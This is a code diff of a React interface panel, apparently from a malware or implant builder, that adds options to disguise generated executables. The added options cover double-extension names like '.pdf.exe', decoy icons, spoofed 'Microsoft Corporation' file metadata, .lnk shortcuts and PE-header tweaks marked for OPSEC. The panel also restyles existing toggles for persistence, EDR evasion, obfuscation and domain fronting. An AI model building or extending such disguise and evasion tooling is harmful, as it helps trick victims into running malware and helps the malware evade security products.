@@ -14,7 +14,7 @@ import { useI18n } from "@/lib/i18n";
 import { AdvancedSection, FieldLabel, PayloadCard } from "./PayloadCard";
 import { BuildResult, BuildStatusBadge } from "./BuildResult";
 
-const BTN_CLASS = "w-full h-10 rounded-lg font-medium flex items-center justify-center gap-x-2 accent-gradient text-primary-foreground shadow-md shadow-primary/25 hover:shadow-lg hover:shadow-primary/35 hover:brightness-110 active:scale-[0.98] disabled:opacity-50";
+const BTN_CLASS = "h-11 w-full rounded-xl text-sm font-semibold tracking-tight flex items-center justify-center gap-x-2 accent-gradient text-primary-foreground shadow-md shadow-primary/25 outline-none transition-all duration-200 hover:shadow-lg hover:shadow-primary/35 hover:brightness-110 focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-card active:scale-[0.98] disabled:opacity-50 disabled:pointer-events-none";
 
 // ─── BinaryPanel (exe / dll) ───────────────────────────────────
 
@@ -55,27 +55,87 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
     >
       <div>
         <FieldLabel>{t("generate.panel.filename")}</FieldLabel>
-        <Input aria-label={t("generate.panel.output_filename")} name={`${id}-filename`} value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} />
+        <Input aria-label={t("generate.panel.output_filename")} name={`${id}-filename`} value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="bg-background/60 font-mono text-xs transition-colors focus-visible:border-primary/40" placeholder="forge_agent.exe" />
+        {(() => {
+          const extMap: Record<string,string> = { jpg: ".jpg", pdf: ".pdf", doc: ".docx", xls: ".xlsx", zip: ".zip" };
+          const ext = extMap[form.disguise_as] || "";
+          let preview = form.filename || "forge_agent.exe";
+          if (ext && !preview.toLowerCase().includes(ext)) {
+            const base = preview.replace(/\.exe$/i, "").replace(/\.jpg$/i, "").replace(/\.pdf$/i, "").replace(/\.docx$/i, "").replace(/\.xlsx$/i, "").replace(/\.zip$/i, "");
+            preview = base + ext + ".exe";
+          }
+          if (!preview.toLowerCase().endsWith(".exe") && !preview.toLowerCase().endsWith(".dll")) preview += ".exe";
+          const show = preview !== form.filename;
+          return show ? <div className="mt-1.5 inline-flex max-w-full items-center gap-1.5 truncate rounded-md bg-primary/10 px-2 py-1 font-mono text-xs text-primary ring-1 ring-primary/20">→ {preview} {form.lnk_disguise ? "+ .lnk" : ""}</div> : null;
+        })()}
       </div>
-      <div className="rounded-lg border border-border/60 p-3 space-y-3 bg-muted/20">
-        <FieldLabel>{t("generate.panel.icon")}</FieldLabel>
-        <Input type="file" accept=".ico,.png" onChange={(e) => {
-          const file = e.target.files?.[0] || null;
-          if (!file) { setForm({ ...form, icon_file: null, icon_b64: "" }); return; }
-          if (file.size > 256 * 1024) { alert(t("generate.toast.icon_too_large")); return; }
-          const reader = new FileReader();
-          reader.onload = () => {
-            const b64 = (reader.result as string).split(",")[1] || "";
-            setForm((prev) => ({ ...prev, icon_file: file, icon_b64: b64 }));
-          };
-          reader.readAsDataURL(file);
-        }} />
-        {form.icon_b64 && <div className="text-xs text-muted-foreground">{t("generate.panel.icon_selected")}: {form.icon_file?.name} ({Math.round(form.icon_b64.length * 0.75 / 1024)}KB)</div>}
-        <div className="flex items-center gap-x-2">
-          <Checkbox id={`${id}-disguise-jpg`} checked={form.disguise_as === "jpg"} onCheckedChange={(checked) => setForm({ ...form, disguise_as: checked === true ? "jpg" : "" })} />
-          <Label htmlFor={`${id}-disguise-jpg`} className="text-sm text-foreground">{t("generate.panel.disguise_as_jpg")}</Label>
+      <div className="space-y-3 rounded-xl border border-border/60 bg-gradient-to-b from-muted/40 to-muted/10 p-3.5 shadow-sm">
+        <div className="flex items-center gap-2">
+          <div className="size-1.5 rounded-full bg-primary" aria-hidden="true" />
+          <FieldLabel className="mb-0">{t("generate.panel.icon")}</FieldLabel>
         </div>
-        {form.disguise_as === "jpg" && <div className="text-xs text-amber-600">{t("generate.panel.disguise_hint")}</div>}
+        <div className="grid grid-cols-2 gap-2">
+          <div>
+            <FieldLabel>{t("generate.panel.icon_preset") || "Icon preset"}</FieldLabel>
+            <Select value={form.icon_preset || "__custom"} onValueChange={(val) => val != null && setForm({ ...form, icon_preset: val === "__custom" ? "" : val, icon_b64: val !== "__custom" ? "" : form.icon_b64, icon_file: val !== "__custom" ? null : form.icon_file })}>
+              <SelectTrigger className="w-full"><SelectValue placeholder={t("generate.panel.icon_preset_placeholder") || "Choose preset or upload"} /></SelectTrigger>
+              <SelectContent>
+                <SelectItem value="__custom">{t("generate.panel.icon_custom") || "Custom upload"}</SelectItem>
+                <SelectItem value="jpg">JPG Image</SelectItem>
+                <SelectItem value="pdf">PDF Document</SelectItem>
+                <SelectItem value="word">Word Document</SelectItem>
+                <SelectItem value="folder">Folder</SelectItem>
+                <SelectItem value="chrome">Chrome</SelectItem>
+                <SelectItem value="zip">ZIP Archive</SelectItem>
+              </SelectContent>
+            </Select>
+          </div>
+          <div>
+            <FieldLabel>{t("generate.panel.icon_upload") || "Upload .ico/.png"}</FieldLabel>
+            <Input type="file" accept=".ico,.png" onChange={(e) => {
+              const file = e.target.files?.[0] || null;
+              if (!file) { setForm({ ...form, icon_file: null, icon_b64: "" }); return; }
+              if (file.size > 256 * 1024) { alert(t("generate.toast.icon_too_large")); return; }
+              const reader = new FileReader();
+              reader.onload = () => {
+                const b64 = (reader.result as string).split(",")[1] || "";
+                setForm((prev) => ({ ...prev, icon_file: file, icon_b64: b64, icon_preset: "" }));
+              };
+              reader.readAsDataURL(file);
+            }} />
+          </div>
+        </div>
+        {form.icon_b64 && <div className="flex items-center gap-2 rounded-lg bg-background/60 px-2.5 py-1.5 text-xs text-muted-foreground ring-1 ring-border/40"><img alt={t("generate.panel.icon") || "Icon preview"} src={`data:image/png;base64,${form.icon_b64}`} className="size-6 rounded-md border border-border shadow-sm" /><span className="min-w-0 flex-1 truncate">{t("generate.panel.icon_selected")}: {form.icon_file?.name || "preset"} ({Math.round(form.icon_b64.length * 0.75 / 1024)}KB)</span></div>}
+        {form.icon_preset && !form.icon_b64 && (
+          <div className="flex items-center gap-2 rounded-lg bg-background/60 px-2.5 py-1.5 text-xs text-muted-foreground ring-1 ring-border/40">
+            <span className={`inline-block size-6 shrink-0 rounded-md border border-border shadow-sm ${form.icon_preset === "pdf" ? "bg-destructive" : form.icon_preset === "word" || form.icon_preset === "doc" ? "bg-info" : form.icon_preset === "xls" ? "bg-success" : form.icon_preset === "zip" ? "bg-warning" : form.icon_preset === "chrome" ? "bg-info" : "bg-primary"}`} aria-hidden="true" />
+            <span className="truncate">Preset: {form.icon_preset} · {form.icon_preset === "pdf" ? "PDF" : form.icon_preset === "word" || form.icon_preset === "doc" ? "Word" : form.icon_preset === "xls" ? "Excel" : form.icon_preset}</span>
+          </div>
+        )}
+        <div>
+          <FieldLabel>{t("generate.panel.disguise_as") || "Disguise as"}</FieldLabel>
+          <Select value={form.disguise_as || ""} onValueChange={(val) => val != null && setForm({ ...form, disguise_as: val === "__none" ? "" : val })}>
+            <SelectTrigger className="w-full"><SelectValue placeholder="No disguise" /></SelectTrigger>
+            <SelectContent>
+              <SelectItem value="__none">No disguise</SelectItem>
+              <SelectItem value="jpg">JPG Image (*.jpg.exe)</SelectItem>
+              <SelectItem value="pdf">PDF Document (*.pdf.exe)</SelectItem>
+              <SelectItem value="doc">Word Document (*.docx.exe)</SelectItem>
+              <SelectItem value="xls">Excel Sheet (*.xlsx.exe)</SelectItem>
+              <SelectItem value="zip">ZIP Archive (*.zip.exe)</SelectItem>
+              <SelectItem value="folder">Folder (VersionInfo only)</SelectItem>
+            </SelectContent>
+          </Select>
+        </div>
+        {form.disguise_as && <div className="rounded-lg border border-warning/25 bg-warning/10 px-2.5 py-1.5 text-xs leading-5 text-warning-foreground">{t("generate.panel.disguise_hint")}: *{form.disguise_as === "doc" ? ".docx" : form.disguise_as === "xls" ? ".xlsx" : "."+form.disguise_as}.exe</div>}
+        <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
+          <div><FieldLabel>FileDescription</FieldLabel><Input placeholder="JPEG Image" value={form.file_description} onChange={(e) => setForm({ ...form, file_description: e.target.value })} className="bg-background/60 text-xs" /></div>
+          <div><FieldLabel>CompanyName</FieldLabel><Input placeholder="Microsoft Corporation" value={form.company_name} onChange={(e) => setForm({ ...form, company_name: e.target.value })} className="bg-background/60 text-xs" /></div>
+        </div>
+        <label htmlFor={`${id}-lnk`} className="flex cursor-pointer items-center gap-x-2.5 rounded-lg border border-border/50 bg-background/60 px-2.5 py-2 transition-colors hover:border-primary/25 hover:bg-muted/40 has-checked:border-primary/30 has-checked:bg-primary/5">
+          <Checkbox id={`${id}-lnk`} checked={form.lnk_disguise} onCheckedChange={(checked) => setForm({ ...form, lnk_disguise: checked === true })} />
+          <span className="text-sm text-foreground">Generate .lnk shortcut alongside EXE</span>
+        </label>
       </div>
       {cfg.showP2P && (
         <AdvancedSection title={t("generate.panel.p2p_config")}>
@@ -131,36 +191,48 @@ export const BinaryPanel = React.memo(function BinaryPanel({ variant, form, setF
           </SelectContent>
         </Select>
       </div>
-      <div className="flex items-center gap-x-2">
-        <Checkbox id={`${id}-persist`} aria-label={t("generate.panel.persist_aria")} checked={form.persist} onCheckedChange={(checked) => setForm({ ...form, persist: checked === true })} />
-        <Label htmlFor={`${id}-persist`} className="text-sm text-foreground">{t("generate.panel.persist")}</Label>
+      <AdvancedSection title={t("generate.panel.pe_options") || "PE Tweaks"}>
+        <div className="grid grid-cols-2 gap-2">
+          <div><FieldLabel>Timestamp</FieldLabel><Select value={form.pe_timestamp || "zero"} onValueChange={(val) => val != null && setForm({ ...form, pe_timestamp: val })}><SelectTrigger className="w-full"><SelectValue /></SelectTrigger><SelectContent><SelectItem value="zero">Zero (OPSEC)</SelectItem><SelectItem value="random">Random</SelectItem><SelectItem value="keep">Keep Go</SelectItem></SelectContent></Select></div>
+          <div><FieldLabel>Section names</FieldLabel><Select value={form.pe_sections || "default"} onValueChange={(val) => val != null && setForm({ ...form, pe_sections: val })}><SelectTrigger className="w-full"><SelectValue /></SelectTrigger><SelectContent><SelectItem value="default">Default</SelectItem><SelectItem value="random">Random</SelectItem></SelectContent></Select></div>
+          <div><FieldLabel>Benign imports</FieldLabel><Select value={form.pe_imports || "none"} onValueChange={(val) => val != null && setForm({ ...form, pe_imports: val })}><SelectTrigger className="w-full"><SelectValue /></SelectTrigger><SelectContent><SelectItem value="none">None</SelectItem><SelectItem value="kernel32+user32">kernel32+user32</SelectItem></SelectContent></Select></div>
+          <div><FieldLabel>Manifest</FieldLabel><Select value={form.pe_manifest || "default"} onValueChange={(val) => val != null && setForm({ ...form, pe_manifest: val })}><SelectTrigger className="w-full"><SelectValue /></SelectTrigger><SelectContent><SelectItem value="default">Default Go</SelectItem><SelectItem value="blend">Blend (dpiAware+Win10)</SelectItem></SelectContent></Select></div>
+        </div>
+      </AdvancedSection>
+      <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
+        <label htmlFor={`${id}-persist`} className="flex cursor-pointer items-center gap-x-2.5 rounded-lg border border-border/50 bg-background/40 px-2.5 py-2 transition-colors hover:border-primary/25 hover:bg-muted/30 has-checked:border-primary/30 has-checked:bg-primary/5">
+          <Checkbox id={`${id}-persist`} aria-label={t("generate.panel.persist_aria")} checked={form.persist} onCheckedChange={(checked) => setForm({ ...form, persist: checked === true })} />
+          <span className="text-sm text-foreground">{t("generate.panel.persist")}</span>
+        </label>
+        <label htmlFor={`${id}-skip-tls`} className="flex cursor-pointer items-center gap-x-2.5 rounded-lg border border-border/50 bg-background/40 px-2.5 py-2 transition-colors hover:border-primary/25 hover:bg-muted/30 has-checked:border-primary/30 has-checked:bg-primary/5">
+          <Checkbox id={`${id}-skip-tls`} aria-label={t("generate.panel.skip_tls_aria")} checked={form.skip_tls} onCheckedChange={(checked) => setForm({ ...form, skip_tls: checked === true })} />
+          <span className="text-sm text-muted-foreground">{t("generate.panel.skip_tls")}</span>
+        </label>
       </div>
-      <div className="flex items-center gap-x-2">
-        <Checkbox id={`${id}-skip-tls`} aria-label={t("generate.panel.skip_tls_aria")} checked={form.skip_tls} onCheckedChange={(checked) => setForm({ ...form, skip_tls: checked === true })} />
-        <Label htmlFor={`${id}-skip-tls`} className="text-sm text-muted-foreground">{t("generate.panel.skip_tls")}</Label>
-      </div>
-      <div className="flex items-start gap-x-2">
-        <Checkbox id={`${id}-evasion`} aria-label={t("generate.panel.edr_evasion_aria")} checked={form.evasion} onCheckedChange={(checked) => setForm({ ...form, evasion: checked === true })} />
-        <Label htmlFor={`${id}-evasion`} className="text-sm text-muted-foreground">
-          {t("generate.panel.edr_evasion")}
-          <span className="block text-(--fs-micro-sm) text-muted-foreground font-normal">{t("generate.panel.edr_evasion_hint")}</span>
-        </Label>
-      </div>
-      <div className="flex items-start gap-x-2">
-        <Checkbox id={`${id}-ghost-mode`} aria-label={t("generate.panel.ghost_mode_aria")} checked={form.ghost_mode} onCheckedChange={(checked) => setForm({ ...form, ghost_mode: checked === true })} />
-        <Label htmlFor={`${id}-ghost-mode`} className="text-sm text-muted-foreground">
-          {t("generate.panel.ghost_mode")}
-          <span className="block text-(--fs-micro-sm) text-muted-foreground font-normal">{t("generate.panel.ghost_mode_hint")}</span>
-        </Label>
+      <div className="space-y-2">
+        <label htmlFor={`${id}-evasion`} className="flex cursor-pointer items-start gap-x-2.5 rounded-lg border border-border/50 bg-background/40 px-2.5 py-2 transition-colors hover:border-primary/25 hover:bg-muted/30 has-checked:border-primary/30 has-checked:bg-primary/5">
+          <Checkbox id={`${id}-evasion`} aria-label={t("generate.panel.edr_evasion_aria")} checked={form.evasion} onCheckedChange={(checked) => setForm({ ...form, evasion: checked === true })} className="mt-0.5" />
+          <span className="text-sm text-muted-foreground">
+            {t("generate.panel.edr_evasion")}
+            <span className="block font-normal text-muted-foreground/80 text-xs leading-4">{t("generate.panel.edr_evasion_hint")}</span>
+          </span>
+        </label>
+        <label htmlFor={`${id}-ghost-mode`} className="flex cursor-pointer items-start gap-x-2.5 rounded-lg border border-border/50 bg-background/40 px-2.5 py-2 transition-colors hover:border-primary/25 hover:bg-muted/30 has-checked:border-primary/30 has-checked:bg-primary/5">
+          <Checkbox id={`${id}-ghost-mode`} aria-label={t("generate.panel.ghost_mode_aria")} checked={form.ghost_mode} onCheckedChange={(checked) => setForm({ ...form, ghost_mode: checked === true })} className="mt-0.5" />
+          <span className="text-sm text-muted-foreground">
+            {t("generate.panel.ghost_mode")}
+            <span className="block font-normal text-muted-foreground/80 text-xs leading-4">{t("generate.panel.ghost_mode_hint")}</span>
+          </span>
+        </label>
       </div>
       {variant === "exe" && (
-        <div className="flex items-start gap-x-2">
-          <Checkbox id={`${id}-obfuscate`} aria-label={t("generate.panel.obfuscate_aria")} checked={form.obfuscate} onCheckedChange={(checked) => setForm({ ...form, obfuscate: checked === true })} />
-          <Label htmlFor={`${id}-obfuscate`} className="text-sm text-muted-foreground">
+        <label htmlFor={`${id}-obfuscate`} className="flex cursor-pointer items-start gap-x-2.5 rounded-lg border border-border/50 bg-background/40 px-2.5 py-2 transition-colors hover:border-primary/25 hover:bg-muted/30 has-checked:border-primary/30 has-checked:bg-primary/5">
+          <Checkbox id={`${id}-obfuscate`} aria-label={t("generate.panel.obfuscate_aria")} checked={form.obfuscate} onCheckedChange={(checked) => setForm({ ...form, obfuscate: checked === true })} className="mt-0.5" />
+          <span className="text-sm text-muted-foreground">
             {t("generate.panel.obfuscate")}
-            <span className="block text-(--fs-micro-sm) text-muted-foreground font-normal">{t("generate.panel.obfuscate_hint")}</span>
-          </Label>
-        </div>
+            <span className="block font-normal text-muted-foreground/80 text-xs leading-4">{t("generate.panel.obfuscate_hint")}</span>
+          </span>
+        </label>
       )}
       <div>
         <FieldLabel>{t("generate.panel.domain_front")}</FieldLabel>
